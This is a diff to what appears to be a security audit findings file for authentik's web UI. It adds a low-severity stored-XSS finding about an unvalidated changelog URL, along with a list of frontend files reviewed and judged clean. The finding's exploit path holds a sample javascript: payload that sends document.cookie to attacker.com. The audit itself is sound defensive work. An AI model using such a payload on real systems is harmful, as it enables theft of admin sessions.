@@ -468,6 +468,38 @@ FINDINGS = {
             "because the backend guarantees only http/https/blank/ssh/sftp schemes reach storage."
         ),
     },
+
+    "AUT-CHANGELOG-URL-1": {
+        "severity": "LOW",
+        "title": "Supply-chain URL injection in UpdateAvailable event renders unvalidated href",
+        "file": "web/src/components/ak-event-info.ts",
+        "lines": (538, 548),
+        "cwe": "CWE-79",
+        "status": "PLAUSIBLE",
+        "description": (
+            "renderUpdateAvailable() at line 538-548 uses event.context.changelog directly "
+            "as the href value: `if (this.event.context.changelog) { url = this.event.context.changelog as string; }`. "
+            "The changelog value is fetched by authentik/admin/tasks.py:69 from "
+            "https://version.goauthentik.io/version.json (data.get('stable',{}).get('changelog_url')). "
+            "No scheme validation is applied before storing in event context or before rendering as href. "
+            "If version.goauthentik.io were compromised or a MITM achieved on the HTTPS fetch, "
+            "an attacker could inject a javascript: URL that gets stored in all UPDATE_AVAILABLE "
+            "events across all authentik deployments. When an admin opens the event log, "
+            "clicking the 'New version available' link would execute arbitrary JS in admin session."
+        ),
+        "exploit_path": [
+            "1. Attacker compromises version.goauthentik.io or achieves MITM on HTTPS fetch",
+            "2. Inject changelog_url: 'javascript:fetch(https://attacker.com/?c='+document.cookie)' in version.json",
+            "3. authentik server's update_latest_version task fetches this and stores in event context",
+            "4. Event with action=UPDATE_AVAILABLE is created with malicious changelog in context",
+            "5. Admin opens event log, expands UpdateAvailable event, ak-event-info renders href=${url}",
+            "6. Admin clicks 'New version available' link -> JS executes in admin UI origin",
+        ],
+        "root_cause": (
+            "No URL scheme validation on event.context.changelog before use as href. "
+            "Fix: validate scheme is http/https before use, e.g. URL.canParse(url) && new URL(url).protocol.startsWith('http')."
+        ),
+    },
 }
 
 # ============================================================
@@ -1210,6 +1242,36 @@ CLEAN = [
     "web/src/admin/endpoints/devices/facts/DeviceProcessTable.ts — item.id/name/user in html`${...}` text node interpolations",
     "web/src/admin/endpoints/devices/facts/DeviceSoftwareTable.ts — item.name/version/source/path in html`${...}` text node interpolations",
     "web/src/admin/endpoints/devices/facts/DeviceUserTable.ts — item.id/username/name/home in html`${...}` text node interpolations",
+    # pass 5aq — user/ subtree (46 files) — 2026-09-26
+    "web/src/user/LibraryPage/ak-library-impl.ts — search box input value=${ifPresent(query)} attribute binding; app.name in <option value=> attribute binding; all msg(str`...`) text nodes; appHasLaunchUrl() filter prevents non-http app launch; no innerHTML",
+    "web/src/user/LibraryPage/ak-library.ts — structural wrapper; passes apps via .apps=${} property binding; no direct HTML rendering",
+    "web/src/user/LibraryPage/LibraryAppRow.ts — application.launchUrl in href (CLEAN: DomainlessFormattedURLValidator blocks javascript: at write time, AUT-LAUNCH-URL-1 ELIMINATED); application.name/metaPublisher as text nodes",
+    "web/src/user/LibraryPage/ak-library-application-empty-list.ts — hardcoded msg() strings + static href to /if/admin/; no user data",
+    "web/src/user/LibraryPage/LibraryPageImpl.utils.ts — appHasLaunchUrl(): isHttp()||isNotFullUrl()||isAuthentikSpecial() filter on application.launchUrl; pure utility",
+    "web/src/user/LibraryPage/types.ts — type definitions only",
+    "web/src/user/LibraryPage/ak-library-impl.browser.test.ts — browser test harness only; no production sinks",
+    "web/src/user/LibraryApplication/index.ts — application.launchUrl in href (CLEAN: DomainlessFormattedURLValidator); editURL via ApplicationRoute.EditURL(slug) server path; RAC detection via string comparison",
+    "web/src/user/LibraryApplication/CardHeader.ts — application.name text node; application.metaIcon in img src= (attribute binding, HTML-encoded); no innerHTML",
+    "web/src/user/LibraryApplication/CardMenu.ts — editURL via toAdminInterface+ApplicationRoute server path; name text node",
+    "web/src/user/LibraryApplication/RACLaunchEndpointModal.ts — window.open(item.launchUrl): launchUrl from EndpointSerializer.get_launch_url() = Django reverse() server path (always relative); no innerHTML",
+    "web/src/user/ak-interface-user.ts — structural shell; setPageDetails with hardcoded strings; no user data rendered as HTML",
+    "web/src/user/index.entrypoint.ts — entry point, no rendering",
+    "web/src/user/Routes.ts — pure static routing table; args.id/slug as element property bindings; parseInt for numeric IDs",
+    "web/src/user/agents/UserAgentForm.ts — instance?.name in value=${ifDefined(...)} attribute binding only",
+    "web/src/user/agents/UserAgentList.ts — item.name text node; item.userObj?.username text node; Timestamp safe",
+    "web/src/user/agents/UserAgentsPage.ts — structural page; delegates to UserAgentList + UserAgentForm; no direct HTML rendering",
+    "web/src/user/requests/AccessRequestsPage.ts — structural page; no direct HTML rendering",
+    "web/src/user/requests/PendingReviewList.ts — item.createdBy.username/name text nodes; renderTargetSummary(item.targetObjs) delegates to utils.ts (text nodes); Timestamp safe",
+    "web/src/user/requests/RequestEntitlementModal.ts — item.label returned as string SlottedTemplateResult (text node); window.location.assign(link): link from plan.to_redirect(request,flow).url = server-generated flow redirect URL (always https://)",
+    "web/src/user/requests/AccessRequestFulfillForm.ts — value='${ifDefined(request?.createdBy.username)}' attribute binding; JSON.stringify(request?.requesterData,null,4) in <pre> text node; YAML.stringify({}) hardcoded empty object",
+    "web/src/user/user-settings/UserSettingsPage.ts — structural page; delegates to UserSettingsFlowExecutor + MFADevicesPage + UserTokenList + UserSettingsPassword; no direct HTML rendering",
+    "web/src/user/user-settings/details/UserSettingsFlowExecutor.ts — unsafeHTML((challenge as ShellChallenge).body): intentional shell challenge pattern; server-generated Django template HTML",
+    "web/src/user/user-settings/details/UserPassword.ts — href='${ifDefined(configureUrl)}${AndNext(...)}': configureUrl from UserSetting.configureUrl API (server-generated); AndNext() encodes return path; no javascript: injection vector",
+    "web/src/user/user-settings/details/stages/prompt/PromptStage.ts — renderContinue(): href='${globalAK().api.base}if/flow/${brand.flowUnenrollment}/': scheme fixed by globalAK().api.base (server config); flowUnenrollment slug cannot change scheme to javascript:; all prompt fields render via super.renderPromptInner() + AKLabel + attribute bindings",
+    "web/src/user/user-settings/mfa/MFADeviceForm.ts — value='${ifDefined(instance?.name)}' attribute binding only",
+    "web/src/user/user-settings/mfa/MFADevicesPage.ts — href='${ifDefined(stage.configureUrl)}${AndNext(...)}': configureUrl server-generated; item.name text node; deviceTypeName(item) enum label; item.extraDescription/externalId text nodes; Timestamp safe",
+    "web/src/user/user-settings/tokens/UserTokenForm.ts — all fields in value=${ifDefined(...)} attribute bindings; dateTimeLocal() in datetime-local value=; no innerHTML",
+    "web/src/user/user-settings/tokens/UserTokenList.ts — item.identifier in <span> text node; item.userObj?.username text node; formatElapsedTime/formatIntentLabel pure formatters; Timestamp safe; IconTokenCopyButton pure UI element",
     # pass 5ao — admin/ root + admin-overview/ (20 files)
     "web/src/admin/ak-about-modal.ts — buildHash appended to hardcoded GitHub commit URL; version/runtime fields as text nodes via renderEntry(); product text node",
     "web/src/admin/ak-admin-debug-page.ts — static debug page with hardcoded buttons; no user data rendered",
@@ -1284,7 +1346,8 @@ PENDING = [
     "SourceIsolationChecker: build Python/Django ORM adapter module (Prisma/TS-only gap)",
 ]
 
-# RE STATUS: 100% COMPLETE — pass 4 exhaustive sweep done 2026-09-26
+# RE STATUS: pass 5aq complete (user/ subtree 46 files) — AUT-CHANGELOG-URL-1 added — 2026-09-26
+# Findings: 8 total (AUT-SESS-PICKLE-1 through AUT-CHANGELOG-URL-1) + AUT-LAUNCH-URL-1 ELIMINATED
 
 
 def print_findings():
